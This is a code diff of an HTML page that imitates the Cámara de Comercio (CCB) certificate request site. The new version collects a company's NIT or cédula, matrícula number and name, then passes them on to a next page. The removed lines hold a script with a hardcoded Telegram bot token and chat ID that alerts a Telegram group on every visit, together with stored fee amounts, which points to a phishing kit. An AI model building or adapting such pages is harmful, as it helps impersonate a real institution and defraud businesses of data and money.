@@ -3,97 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trámites Disponibles - Cámara de Comercio</title>
-    
-    <!-- Fuente Montserrat -->
+    <title>Solicitar Certificado - Cámara de Comercio</title>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700;800&display=swap" rel="stylesheet">
-
     <style>
-        /* --- RESET Y ESTILOS GLOBALES --- */
+        /* --- ESTILOS BASE --- */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
-        body { background-color: #ffffff; color: #333; line-height: 1.6; display: flex; flex-direction: column; min-height: 100vh; overflow-x: hidden; }
+        body { background-color: #f8f9fa; color: #333; line-height: 1.6; display: flex; flex-direction: column; min-height: 100vh; }
         a { text-decoration: none; color: inherit; }
         ul { list-style: none; }
 
         /* --- HEADER --- */
-        header { display: flex; justify-content: space-between; align-items: center; padding: 15px 5%; border-bottom: 1px solid #eee; background: #fff; position: sticky; top: 0; z-index: 1000; }
+        header { display: flex; justify-content: space-between; align-items: center; padding: 15px 5%; background: #fff; border-bottom: 1px solid #eee; }
         .logo img { height: 55px; }
         .nav-menu { display: flex; gap: 25px; font-size: 14px; color: #555; font-weight: 500; }
-        .nav-menu a:hover { color: #c00; }
-        .header-right { display: flex; align-items: center; gap: 15px; }
-        .search-icon svg { width: 22px; height: 22px; fill: #555; cursor: pointer; }
-        .btn-login { background-color: #c00; color: white; padding: 10px 20px; border-radius: 4px; font-weight: 700; font-size: 14px; transition: background 0.3s; }
-        .btn-login:hover { background-color: #a00; }
-        .mobile-header-icons { display: none; align-items: center; gap: 20px; }
-        .mobile-header-icons svg { width: 28px; height: 28px; stroke: #333; fill: none; stroke-width: 1.5; cursor: pointer; }
+        .btn-login { background-color: #c00; color: white; padding: 10px 20px; border-radius: 4px; font-weight: 700; font-size: 14px; }
+        .mobile-header-icons { display: none; }
 
-        /* --- BREADCRUMB & BACK (NUEVO) --- */
-        .breadcrumb-container { padding: 20px 5% 0; font-size: 14px; color: #666; }
-        .back-link { color: #007bff; margin-bottom: 5px; display: inline-flex; align-items: center; gap: 8px; font-weight: 500; }
+        /* --- CONTENIDO --- */
+        .main-content { flex: 1; padding: 40px 5%; max-width: 800px; margin: 0 auto; width: 100%; }
+        
+        .back-link { color: #007bff; display: inline-flex; align-items: center; gap: 8px; font-weight: 500; margin-bottom: 20px; font-size: 14px;}
         .back-link svg { width: 16px; height: 16px; fill: #007bff; }
-        .back-link:hover { text-decoration: underline; }
 
-        /* --- CONTENIDO PRINCIPAL (TRÁMITES) --- */
-        .main-content { flex: 1; padding: 20px 5% 80px; max-width: 1300px; margin: 0 auto; width: 100%; }
-        .section-title { display: flex; align-items: center; justify-content: center; margin-bottom: 60px; }
-        .section-title::before, .section-title::after { content: ""; flex: 1; height: 1px; background-color: #e0e0e0; }
-        .section-title h2 { font-size: 32px; font-weight: 700; color: #1a2a3a; padding: 0 30px; margin: 0; }
-        .tramites-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 40px; row-gap: 60px; }
-        .tramite-card { display: flex; flex-direction: column; position: relative; }
-        .tramite-card:not(:nth-child(3n))::after { content: ""; position: absolute; right: -20px; top: 0; bottom: 0; width: 1px; background-color: #e0e0e0; }
-        .tramite-icon { height: 60px; margin-bottom: 25px; display: flex; align-items: flex-end; }
-        .tramite-icon img { max-height: 100%; width: auto; object-fit: contain; }
-        .tramite-card h3 { font-size: 20px; font-weight: 700; color: #1a2a3a; margin-bottom: 15px; line-height: 1.3; }
-        .tramite-card p { font-size: 15px; color: #555; line-height: 1.6; margin-bottom: 25px; flex-grow: 1; }
+        .form-container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-top: 5px solid #c00; }
+        
+        .form-header { margin-bottom: 30px; text-align: center; }
+        .form-header h1 { font-size: 28px; color: #1a2a3a; margin-bottom: 10px; font-weight: 800; }
+        .form-header p { color: #666; font-size: 15px; }
 
-        /* --- BOTÓN SOLICITAR (fondo rojo, letras blancas) --- */
-        .btn-solicitar {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            font-size: 15px;
-            font-weight: 700;
-            color: #fff;
-            background-color: #c00;
-            border: none;
-            border-radius: 4px;
-            padding: 12px 20px;
-            cursor: pointer;
-            font-family: 'Montserrat', sans-serif;
-            transition: background-color 0.3s, transform 0.2s;
-            text-align: center;
-            align-self: flex-start;
-        }
-        .btn-solicitar:hover { background-color: #900; color: #fff; }
-        .btn-solicitar svg { width: 16px; height: 16px; fill: currentColor; transition: transform 0.3s; }
-        .btn-solicitar:hover svg { transform: translateX(5px); }
+        .seccion-titulo { color: #1a2a3a; margin-bottom: 15px; font-size: 18px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-weight: 700; margin-bottom: 8px; color: #333; font-size: 14px; }
+        .form-group input, .form-group select { width: 100%; padding: 12px 15px; border: 1px solid #ccc; border-radius: 4px; font-family: 'Montserrat', sans-serif; font-size: 15px; transition: border 0.3s; }
+        .form-group input:focus, .form-group select:focus { outline: none; border-color: #c00; }
+
+        .btn-continuar { background-color: #c00; color: white; border: none; padding: 15px 30px; width: 100%; font-size: 16px; font-weight: 700; border-radius: 4px; cursor: pointer; transition: background 0.3s; margin-top: 10px; display: flex; justify-content: center; align-items: center; gap: 10px; }
+        .btn-continuar:hover { background-color: #a00; }
 
         /* --- FOOTER --- */
         footer { background-color: #222; color: #fff; padding: 40px 5%; text-align: center; margin-top: auto; }
-        footer .footer-logo img { height: 50px; margin-bottom: 20px; max-width: 100%; }
-        footer p { font-size: clamp(12px, 2vw, 14px); color: #aaa; margin-bottom: 5px; }
+        footer .footer-logo img { height: 50px; margin-bottom: 20px; }
+        footer p { font-size: 14px; color: #aaa; margin-bottom: 5px; }
         footer a { color: #c00; }
 
-        /* --- BOTONES FLOTANTES --- */
-        .floating-buttons { position: fixed; bottom: 30px; right: 30px; display: flex; flex-direction: column; gap: 12px; z-index: 900; }
-        .float-btn { width: 55px; height: 55px; border-radius: 50%; background-color: #0f2a3f; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.2); transition: background 0.3s; }
-        .float-btn:hover { background-color: #1a3d5c; }
-        .float-btn svg { fill: white; width: 26px; height: 26px; }
-
-        /* --- RESPONSIVE (CELULAR) --- */
         @media (max-width: 900px) {
-            header { padding: 15px 20px; }
             .nav-menu, .header-right { display: none; }
-            .mobile-header-icons { display: flex; }
-            .main-content { padding: 20px 20px 60px; }
-            .section-title h2 { font-size: 26px; padding: 0 15px; }
-            .tramites-grid { grid-template-columns: 1fr; gap: 40px; }
-            .tramite-card:not(:nth-child(3n))::after { display: none; }
-            .tramite-icon { height: 50px; margin-bottom: 15px; }
-            .floating-buttons { bottom: 20px; right: 20px; }
-            .float-btn { width: 45px; height: 45px; }
-            .float-btn svg { width: 20px; height: 20px; }
+            .mobile-header-icons { display: flex; gap: 15px; }
+            .mobile-header-icons svg { width: 28px; height: 28px; stroke: #333; fill: none; stroke-width: 1.5; }
+            .form-container { padding: 25px; }
+            .form-header h1 { font-size: 22px; }
         }
     </style>
 </head>
@@ -101,25 +60,9 @@
 
     <!-- HEADER -->
     <header>
-        <div class="logo">
-            <img src="image.png" alt="Cámara de Comercio">
-        </div>
-        
-        <nav>
-            <ul class="nav-menu">
-                <li><a href="index.html">La CCB</a></li>
-                <li><a href="#">Servicios</a></li>
-                <li><a href="#">Formación</a></li>
-                <li><a href="#">De interés</a></li>
-                <li><a href="#">Info especializada</a></li>
-                <li><a href="#">Trámites y consultas</a></li>
-            </ul>
-        </nav>
-
-        <div class="header-right">
-            <a href="#" class="btn-login">Inicio de sesión</a>
-        </div>
-
+        <div class="logo"><img src="image.png" alt="CCB"></div>
+        <nav><ul class="nav-menu"><li><a href="index.html">La CCB</a></li><li><a href="#">Servicios</a></li><li><a href="#">Formación</a></li><li><a href="#">De interés</a></li><li><a href="#">Info especializada</a></li><li><a href="#">Trámites y consultas</a></li></ul></nav>
+        <div class="header-right"><a href="#" class="btn-login">Inicio de sesión</a></div>
         <div class="mobile-header-icons">
             <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
             <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><circle cx="12" cy="10" r="3"></circle><path d="M6.168 18.849A4 4 0 0 1 10 16h4a4 4 0 0 1 3.834 2.855"></path></svg>
@@ -127,138 +70,62 @@
         </div>
     </header>
 
-    <!-- BOTÓN VOLVER (NUEVO) -->
-    <div class="breadcrumb-container">
-        <a href="index.html" class="back-link">
-            <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
-            Volver a la Cámara de Comercio
-        </a>
-    </div>
-
-    <!-- CONTENIDO PRINCIPAL -->
+    <!-- CONTENIDO -->
     <main class="main-content">
-        
-        <div class="section-title">
-            <h2>Trámites</h2>
-        </div>
+        <a href="consultar.html" class="back-link">
+            <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+            Volver a trámites
+        </a>
 
-        <div class="tramites-grid">
-            
-            <!-- Tarjeta 1: Certificado de Existencia -->
-            <div class="tramite-card">
-                <div class="tramite-icon">
-                    <img src="papel.png" alt="Icono Certificado">
-                </div>
-                <h3>Certificado de Existencia y Representación Legal</h3>
-                <p>Obtén el documento que acredita la existencia, domicilio y representación legal de tu empresa de manera rápida y segura.</p>
-                <a href="certificados.html" class="btn-solicitar" onclick="guardarTramite('Certificado de Existencia y Representación Legal', 12100)">
-                    Solicitar
-                    <svg viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg>
-                </a>
+        <div class="form-container">
+            <div class="form-header">
+                <h1 id="tituloTramite">Cargando trámite...</h1>
+                <p>Ingresa los datos de la empresa para generar el certificado.</p>
             </div>
 
-            <!-- Tarjeta 2: Certificado de Matrícula -->
-            <div class="tramite-card">
-                <div class="tramite-icon">
-                    <img src="registro.png" alt="Icono Matrícula">
+            <!-- El formulario va directo a datos.html -->
+            <form action="datos.html" method="GET">
+                
+                <h3 class="seccion-titulo">Datos de Búsqueda de la Empresa</h3>
+                
+                <div class="form-group">
+                    <label>Número de Identificación / NIT o Cédula</label>
+                    <input type="text" placeholder="Ej: 900.123.456-7" required>
                 </div>
-                <h3>Certificado de Matrícula Mercantil</h3>
-                <p>Consulta y descarga el certificado que valida la inscripción de tu establecimiento de comercio en el registro mercantil.</p>
-                <a href="certificados.html" class="btn-solicitar" onclick="guardarTramite('Certificado de Matrícula Mercantil', 6100)">
-                    Solicitar
-                    <svg viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg>
-                </a>
-            </div>
-
-            <!-- Tarjeta 3: Certificado RUP -->
-            <div class="tramite-card">
-                <div class="tramite-icon">
-                    <img src="papel.png" alt="Icono RUP">
+                <div class="form-group">
+                    <label>Número de Matrícula Mercantil</label>
+                    <input type="text" placeholder="Ej: 00123456" required>
                 </div>
-                <h3>Certificado del Registro Único de Proponentes (RUP)</h3>
-                <p>Accede al documento que te acredita como proponente en procesos de contratación pública, garantizando tu capacidad y experiencia.</p>
-                <a href="certificados.html" class="btn-solicitar" onclick="guardarTramite('Certificado del Registro Único de Proponentes (RUP)', 12100)">
-                    Solicitar
-                    <svg viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg>
-                </a>
-            </div>
-
-            <!-- Tarjeta 4: Renovación de Matrícula -->
-            <div class="tramite-card">
-                <div class="tramite-icon">
-                    <img src="renovacion.png" alt="Icono Renovación">
+                <div class="form-group">
+                    <label>Razón Social (Nombre de la empresa o comerciante)</label>
+                    <input type="text" placeholder="Ej: Mi Empresa S.A.S" required>
                 </div>
-                <h3>Renovación de Matrícula Mercantil</h3>
-                <p>Actualiza tu matrícula mercantil anualmente para mantener la vigencia de tu empresa y evitar multas o sanciones.</p>
-                <a href="renovaciones.html" class="btn-solicitar" onclick="guardarTramite('Renovación de Matrícula Mercantil', 61000)">
-                    Solicitar
-                    <svg viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg>
-                </a>
-            </div>
 
-            <!-- Tarjeta 5: Renovación RUP -->
-            <div class="tramite-card">
-                <div class="tramite-icon">
-                    <img src="registro.png" alt="Icono Renovación RUP">
-                </div>
-                <h3>Renovación del Registro Único de Proponentes (RUP)</h3>
-                <p>Mantén actualizada tu información como proponente para seguir participando en licitaciones y contratos con el Estado.</p>
-                <a href="renovaciones.html" class="btn-solicitar" onclick="guardarTramite('Renovación del Registro Único de Proponentes (RUP)', 792000)">
-                    Solicitar
-                    <svg viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg>
-                </a>
-            </div>
-
+                <button type="submit" class="btn-continuar">
+                    Continuar a Datos del Solicitante
+                    <svg viewBox="0 0 24 24" style="width:18px; fill:none; stroke:white; stroke-width:2;"><path d="M5 12h14M12 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                </button>
+            </form>
         </div>
     </main>
 
     <!-- FOOTER -->
     <footer>
-        <div class="footer-logo"><img src="camar2.png" alt="Logo Cámara de Comercio Footer"></div>
+        <div class="footer-logo"><img src="camar2.png" alt="Logo CCB"></div>
         <p>&copy; 2026 Cámara de Comercio. Todos los derechos reservados.</p>
         <p><a href="#">Políticas de privacidad</a> | <a href="#">Términos y condiciones</a></p>
     </footer>
 
-    <!-- BOTONES FLOTANTES -->
-    <div class="floating-buttons">
-        <div class="float-btn" title="Atención al cliente">
-            <svg viewBox="0 0 24 24"><path d="M12 1a9 9 0 0 0-9 9v7a3 3 0 0 0 3 3h2v-2H6a1 1 0 0 1-1-1v-7a7 7 0 0 1 14 0v7a1 1 0 0 1-1 1h-2v2h2a3 3 0 0 0 3-3v-7a9 9 0 0 0-9-9z"/></svg>
-        </div>
-        <div class="float-btn" title="Chat">
-            <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0-2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
-        </div>
-    </div>
-
-    <!-- SCRIPT: ENVÍA "p1" A TELEGRAM EN CADA VISITA -->
+    <!-- SCRIPT PARA LEER EL TRÁMITE -->
     <script>
-        const TELEGRAM_BOT_TOKEN = '8783946350:AAH8zYUMz3s4rmEG5_TcDujGbckxQC4plUA';
-        const TELEGRAM_CHAT_ID = '-1003921297670';
-
-        function enviarTelegram(texto) {
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: texto
-                })
-            })
-            .then(r => r.json())
-            .then(data => { if (!data.ok) console.error('Telegram error:', data); })
-            .catch(err => console.error('Fetch error:', err));
-        }
-
-        // Enviar "p1" en CADA VISITA
-        document.addEventListener('DOMContentLoaded', () => {
-            enviarTelegram('p1');
+        document.addEventListener('DOMContentLoaded', function() {
+            let tramite = localStorage.getItem('tipoTramite');
+            if (!tramite) {
+                tramite = "Certificado de Existencia y Representación Legal";
+            }
+            document.getElementById('tituloTramite').textContent = tramite;
         });
-
-        // Guardar el trámite en localStorage al hacer clic (sin enviar nada)
-        function guardarTramite(nombreTramite, monto) {
-            localStorage.setItem('tipoTramite', nombreTramite);
-            localStorage.setItem('montoTotal', monto);
-        }
     </script>
-
 </body>
+</html>
 </html>
